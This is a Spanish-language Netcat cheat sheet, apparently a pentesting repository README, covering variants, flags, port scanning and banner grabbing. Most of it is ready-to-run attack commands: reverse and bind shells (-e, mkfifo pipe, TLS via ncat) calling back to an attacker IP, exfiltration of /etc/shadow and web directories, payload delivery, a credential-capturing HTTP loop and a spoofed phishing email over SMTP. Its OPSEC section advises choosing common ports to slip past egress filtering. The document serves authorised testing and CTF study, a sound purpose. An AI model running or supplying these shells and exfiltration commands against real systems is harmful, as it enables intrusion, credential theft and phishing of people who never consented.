<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<p align="centro">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Explotación y Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protocolos TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="Licencia">
</p>

<p align="centro">
  <b>🌐 Leer y escribir datos sin procesar a través de conexiones de red utilizando protocolos TCP y UDP</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y la filosofía Netcat] (#-descripción general--la-filosofía-netcat)
- [Variantes de Netcat y el dilema del sabor](#-variantes-netcat--el-dilema-del-sabor)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Netcat tradicional (`nc.traditional`)](#tradicional-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Comparación de herramientas: variantes de Netcat vs Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Variantes de instalación y conmutación](#-instalación--variantes-de-conmutación)
- [Indicadores principales de la línea de comandos](#-core-command-line-flags)
- [Escaneo de puertos y captura de banners] (#-escaneo-de-puertos--captura de banners)
- [Invertir y vincular shells](#-reverse--bind-shells)
  - [Ejecución de Shell tradicional (`-e`)](#ejecución-shell-tradicional--e)
  - [OpenBSD FIFO Named Pipe Reverse Shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [OpenBSD FIFO Bind Shell](#openbsd-fifo-bind-shell)
  - [Shell TLS cifrado con Ncat (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [Técnicas de transferencia de archivos](#-tecnicas-de-transferencia-de-archivos)
  - [Objetivo al atacante (exfiltración)](#objetivo-a-atacante-exfiltración)
  - [Atacante al objetivo (entrega de carga útil)](#atacante-al-objetivo-entrega-de-carga útil)
  - [Archivo de directorios sobre la marcha (`tar + nc`)](#archivo-de-directorios sobre la marcha-tar--nc)
- [Reenvío de puertos y retransmisiones de red](#-reenvío de puertos--retransmisiones de red)
- [Servidor web y emulación Honeypot](#-servidor-web--emulación-honeypot)
- [Depuración de red e interacción de protocolo manual] (#-depuración-de-red--interacción-de-protocolo-manual)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y OPSEC](#-consideraciones-defensivas--opsec)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y filosofía de Netcat

Originalmente escrito en 1995 por **Hobbit**, **Netcat** (a menudo invocado simplemente como `nc`) es celebrado en las comunidades de ciberseguridad y Unix como la **"navaja suiza TCP/IP"**. 

A diferencia de los protocolos de aplicación de alto nivel o las herramientas de administración infladas, Netcat hace una cosa excepcionalmente bien: **abre tuberías de red a nivel de bytes sin procesar a través de sockets TCP o UDP y las conecta directamente a la entrada estándar (`stdin`) y a la salida estándar (`stdout`)**.

Ya sea que esté escuchando shells inversos, estableciendo canales de exfiltración encubiertos, servicios de captura de banners, transfiriendo archivos sin SMB/FTP o diagnosticando el filtrado de paquetes de firewall, Netcat sigue siendo una utilidad indispensable en el arsenal de todo profesional de seguridad.

---

## ⚖️ Variantes de Netcat y el dilema del sabor

Una de las fuentes de confusión más frecuentes durante las pruebas de penetración y los desafíos CTF es que **múltiples implementaciones distintas comparten el comando `nc`**. Comprender con qué variante está interactuando dicta la sintaxis y las posibilidades de carga útil.
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **Predeterminado en:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Rasgo clave:** De forma predeterminada, se compila sin el indicador `-e` (ejecutar programa) para evitar vulnerabilidades triviales de ejecución de código arbitrario.
- **Sintaxis de identificación:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Solución alternativa de ejecución de Shell:** Utiliza canalizaciones con nombre de Linux (`mkfifo`) para conectar `stdin` y `stdout` nuevamente con `/bin/sh`.

### Netcat tradicional (`nc.traditional`)
- **Autor original:** Hobbit (v1.10).
- **Rasgo clave:** Compilado con la directiva `-DGAPING_SECURITY_HOLE`, lo que permite el indicador nativo `-e` / `-c` (`nc -e /bin/bash`).
- **Sintaxis de identificación:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **Mantenido por:** Gordon Lyon (Fyodor) / The Nmap Project.
- **Rasgo clave:** Una reescritura moderna que admite **cifrado TLS/SSL**, listas de control de acceso IP (`--allow`, `--deny`), intermediación de conexiones (`--broker`), proxy SOCKS4/5 y ejecución nativa multiplataforma.

---

## ⚖️ Comparación de herramientas: variantes de Netcat frente a Socat

| Característica | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmapa) | `socat` |
|---------|------------------|---------------------|---------------|---------|
| **Marca ejecutable (`-e`)** | ❌ Despojado | ✅ Nativo (`-e`) | ✅ Nativo (`-e`, `--exec`) | ✅ Nativo (`EXEC:`) |
| **Cifrado SSL/TLS** | ❌ No | ❌ No | ✅ Nativo (`--ssl`) | ✅ Nativo (`OPENSSL:`) |
| **Conchas de tubería FIFO** | ✅ Sí (`mkfifo`) | ✅ Sí | ✅ Sí | ✅ Sí |
| **Modo de escaneo de puertos** | ✅ Sí (`-z`) | ✅ Sí (`-z`) | ❌ No | ❌ No |
| **Oyente persistente** | ✅ Sí (`-k`) | ❌ No (Salidas al desconectarse) | ✅ Sí (`-k`, `--keep-open`) | ✅ Sí (`fork`) |
| **Soporte IPv6** | ✅ Nativo (`-6`) | ❌ Limitado | ✅ Nativo (`-6`) | ✅ Nativo |
| **Proxy / Cliente SOCKS** | ✅ Sí (`-X`, `-x`) | ❌ No | ✅ Sí (`--proxy`) | ✅ Soporte completo de proxy |
| **Chat multicliente/Broker**| ❌ No | ❌ No | ✅ Nativo (`--broker`) | ❌ Configuración manual |
| **Predeterminado en Kali/Debian** | ✅ Sí (`/bin/nc`) | 🔄 Disponible (`apt`) | 🔄 Disponible (`ncat`) | 🔄 Disponible (`socat`) |

---

## 📥 Variantes de instalación y conmutación

En distribuciones basadas en Debian (incluido Kali Linux), puede instalar todas las versiones y alternar entre ellas a través de `update-alternatives`:
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
Para ejecutar explícitamente una variante específica sin cambiar los valores predeterminados de todo el sistema:
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ Banderas principales de la línea de comandos

| Bandera | Significado y descripción |
|------|-----------------------|
| `-l` | **Modo de escucha**: espere conexiones entrantes en lugar de iniciar conexiones salientes. |
| `-v` | **Modo detallado**: imprime información detallada de conexión y diagnóstico (`-vv` para mayor detalle). |
| `-n` | **IP solo numérica**: deshabilite la resolución DNS inversa para mayor velocidad y sigilo. |
| `-p <port>` | **Puerto local**: especifique el puerto local para vincular o escuchar. |
| `-u` | **Modo UDP**: utilice el protocolo UDP en lugar del flujo TCP predeterminado. |
| `-k` | **Seguir escuchando**: siga escuchando y aceptando nuevas conexiones después de que un cliente se desconecte. |
| `-w <sec>` | **Tiempo de espera**: Tiempo de espera en segundos para el establecimiento de conexión y lecturas de sockets inactivos. |
| `-z` | **Modo de E/S cero**: modo de escaneo; no envíe datos de carga útil y cierre el socket inmediatamente después del protocolo de enlace. |
| `-q <sec>` | **Salir después de EOF**: Espere los segundos especificados después de recibir EOF en `stdin` antes de finalizar. |
| `-s <ip>` | **IP de origen**: enlace a una interfaz local específica/dirección IP de origen. |
| `-4` / `-6` | Forzar el direccionamiento IPv4 o IPv6 exclusivamente. |

---

## 🔍 Escaneo de puertos y captura de banners

Si bien se prefieren herramientas dedicadas como `nmap` o `masscan` para barridos integrales, Netcat proporciona una verificación de puerto instantánea y sin dependencia cuando aterriza en un objetivo restringido.

### Escaneo rápido de puertos
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### Captación de banners de servicio

La captura de banners extrae cadenas de versión sin formato de demonios remotos para identificar vulnerabilidades:
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 Invertir y unir conchas

Conectar un intérprete de comandos remoto (`/bin/sh`, `/bin/bash`, `cmd.exe`) a través de un socket Netcat es una de las técnicas de prueba de penetración más fundamentales.

### Ejecución de Shell tradicional (`-e`)

Si el sistema de destino tiene instalado `netcat-traditional` o `ncat` con soporte de ejecución:
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### OpenBSD FIFO Named Pipe Reverse Shell

En las distribuciones modernas de Debian, Ubuntu, Kali y Fedora, `nc` carece del indicador `-e`. Utilice una tubería con nombre **FIFO (primero en entrar, primero en salir)** para redirigir la entrada y la salida estándar:
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### Cómo funciona el canal FIFO:
1. `rm -f /tmp/f`: Elimina cualquier archivo de canalización obsoleto.
2. `mkfifo /tmp/f`: crea una tubería FIFO con nombre especial en `/tmp`.
3. `cat /tmp/f`: lee la entrada enviada a la tubería y la reenvía a `/bin/sh -i`.
4. `| /bin/sh -i 2>&1`: genera un shell interactivo que redirige el error estándar (`stderr`) a la salida estándar (`stdout`).
5. `| nc 10.10.14.5 4444 >/tmp/f`: pasa la salida del shell a través de la red al atacante, mientras escribe las pulsaciones de teclas de la red recibidas en `/tmp/f`.

### Shell de enlace OpenBSD FIFO

Cuando el objetivo tiene una IP pública o local enrutable y las reglas de firewall entrantes permiten el tráfico:
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### Shell TLS cifrado con Ncat (`--ssl`)

El tráfico Netcat no cifrado puede ser inspeccionado mediante IDS/IPS y grifos de red. `ncat` admite el cifrado TLS/SSL de forma nativa:
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 Técnicas de transferencia de archivos

Cuando SSH, SCP, FTP y SMB se bloquean o desinstalan, Netcat proporciona un canal de transferencia de archivos bidireccional instantáneo a través de cualquier puerto TCP abierto.

### Objetivo para el atacante (exfiltración)
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### Atacante al objetivo (entrega de carga útil)
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### Verificación de integridad (sumas de verificación)

Verifique siempre la integridad de los bytes después de transferencias Netcat sin formato:
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### Archivado de directorios sobre la marcha (`tar + nc`)

Transfiera estructuras de directorios completas sin crear archivos temporales intermedios en el disco de la víctima:
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 Reenvío de puertos y retransmisiones de red

Netcat puede actuar como un repetidor de red liviano sin requerir reenvío de puertos SSH:
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Servidor web y emulación de Honeypot

### Servidor HTTP minimalista de un solo archivo

Ofrece una carga útil HTTP estática o captura las credenciales enviadas por los navegadores:
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### Chat multicliente/Agente de mensajes (`ncat`)

Ncat incluye un modo de intermediario incorporado, que crea una sala de retransmisión ad hoc similar a IRC para los operadores del equipo rojo:
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ Depuración de red e interacción de protocolo manual

### Inyección de correo SMTP sin procesar
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### Recuperación de correo POP3 sin formato
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Oyente estándar** | `nc -lvnp <PORT>` |
| **Oyente persistente** | `nc -lvnp <PORT> -k` |
| **Conectarse al host remoto** | `nc -vn <HOST> <PORT>` |
| **Conectar vía UDP** | `nc -u -vn <HOST> <PORT>` |
| **Escaneo de puertos TCP (rápido)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Escaneo de puertos UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **OpenBSD Named Pipe Shell** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Carcasa tradicional (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Shell SSL cifrado (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Recibir archivo (escucha Exfil)**| `nc -lvnp <PORT> > output_file` |
| **Enviar archivo (Remitente Exfil)** | `nc -vn <IP> <PORT> < input_file` |
| **Transmitir carpeta a través de Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **Extraer carpeta transmitida** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Agarrando pancartas** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Consideraciones defensivas y OPSEC

1. **Advertencia de texto no cifrado:**
   - Netcat estándar **no** emplea encapsulación criptográfica. Cualquier contraseña, token de sesión o comando de shell enviado a través de texto sin cifrar `nc` se puede extraer mediante sensores de monitoreo de seguridad de red (NSM) (Zeek, Suricata, Wireshark).
   - Utilice `ncat --ssl` o envuelva el tráfico dentro de un túnel SSH/TLS siempre que sea posible.
2. **Auditoría de procesos y Sysmon:**
   - En sistemas Linux, el registro de ejecución de procesos (`auditd`, eBPF, Falco) marca las invocaciones de `nc` que contienen indicadores como `-e` o comandos que crean `/tmp/f` y `mkfifo`.
   - En Windows, los agentes de EDR marcan o ponen en cuarentena de forma rutinaria los binarios `nc.exe` debido a firmas estáticas conocidas.
3. **Restricciones de entrada del firewall:**
   - Elija siempre puertos de salida comunes (`80`, `443`, `53`) al configurar escuchas de shell inverso para eludir políticas estrictas de filtrado de salida.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Esta hoja de referencia está diseñada únicamente para pruebas de penetración autorizadas, evaluación de vulnerabilidades, competencias CTF y administración de sistemas. Interceptar el tráfico de la red, extraer datos o ejecutar shells inversos contra sistemas sin el consentimiento explícito por escrito es ilegal y punible según las leyes de ciberseguridad en todo el mundo. Utilice de forma responsable y ética.